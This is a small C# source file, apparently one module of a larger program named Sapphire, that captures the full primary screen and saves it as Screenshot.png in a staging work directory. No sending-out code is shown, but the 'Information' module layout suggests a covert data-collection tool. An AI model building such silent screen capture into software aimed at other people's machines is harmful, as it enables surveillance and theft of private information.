using System.IO;
using System.Drawing;
using System.Windows.Forms;
using Sapphire.Modules.Helpers;

namespace Sapphire.Modules.Information
{
    class Screenshot
    {
        private static int width = int.Parse(Screen.PrimaryScreen.Bounds.Width.ToString());
        private static int height = int.Parse(Screen.PrimaryScreen.Bounds.Height.ToString());
 
        public static void Make()
        {
            Bitmap screen = new Bitmap(width, height);
            Size size = new Size(screen.Width, screen.Height);
            Graphics graphics = Graphics.FromImage(screen);
            graphics.CopyFromScreen(0, 0, 0, 0, size);
            string path = FileManager.GetWorkDirectory();
            if (string.IsNullOrEmpty(path))
                throw new System.Exception("[ERROR] work directory don't created");

            screen.Save(path + "Screenshot.png");
        }
    }
}
